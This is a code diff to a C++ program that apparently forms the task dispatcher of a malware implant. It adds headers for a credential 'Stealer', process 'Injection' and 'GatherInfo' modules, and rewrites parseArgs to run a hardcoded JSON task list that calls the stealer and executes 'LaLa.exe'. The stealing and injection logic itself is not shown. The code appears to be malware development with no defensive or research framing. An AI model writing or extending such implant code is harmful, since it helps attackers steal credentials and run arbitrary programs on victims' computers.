@@ -4,6 +4,9 @@
 #include "..\nlohmann\json.hpp"
 #include "..\Stealer\stealer.h"
 #include <iostream>
+#include "..\Feiyu\Injection.h"
+#include "..\Feiyu\GatherInfo.h"
+
 //#include "..\HTTPstuff.h"
 
 using json = nlohmann::json;
@@ -139,14 +142,23 @@ std::string exec(char* program, char* args){
     return std::string(buffer);
 }
 
-int parseArgs(json response){
-    size_t numTasks = response.array().size();
+int parseArgs(){
+    //std::string t = {R"([{\"command\": \"Stealer\", \"args\": \"\"}, {\"command\": \"FileExec\", \"args\": \"LaLa.exe\"} ])"};
+    json response = json::parse("[{\"command\": \"Stealer\", \"args\": \"\"}, {\"command\": \"FileExec\", \"args\": \"LaLa.exe\"} ]");
+    printf("In parse\n");
+   
+    std::cout << response << '\n';
     
-    for (int i =0; i < numTasks; i++){
-        std::string command = response.at(0).at("command");
-        std::cout << command;
-        std::string args = response.at(0).at("args");
-        std::cout << args;
+
+    
+    printf("NUMTASKS : %d \n", response.size());
+    
+    
+    for (int i =0; i < response.size(); i++){
+        std::string command = response.at(i).at("command");
+        std::cout << command <<"\n";
+         std::string args = response.at(i).at("args");
+        std::cout << args << "\n";
         if (command.compare("Stealer") == 0){
             printf("in stealer \n");
             //json res = driver();
@@ -179,9 +191,11 @@ int parseArgs(json response){
 }
 
 int main(int argc, char* argv[]){
-
-    json test = json("[{\"command\": \"Stealer\", \"args\": \"\"}, {\"command\": \"FileExec\", \"args\": \"LaLa.exe\"} ]");
-    parseArgs(test);
+    printf("STARTING\n");
+   // json a = new json("[{\"command\": \"Stealer\", \"args\": \"\"}, {\"command\": \"FileExec\", \"args\": \"LaLa.exe\"} ]");
+    //json test = json("[{\"command\": \"Stealer\", \"args\": \"\"}, {\"command\": \"FileExec\", \"args\": \"LaLa.exe\"} ]");
+    //std::cout << test;
+    parseArgs();
 
 
 }
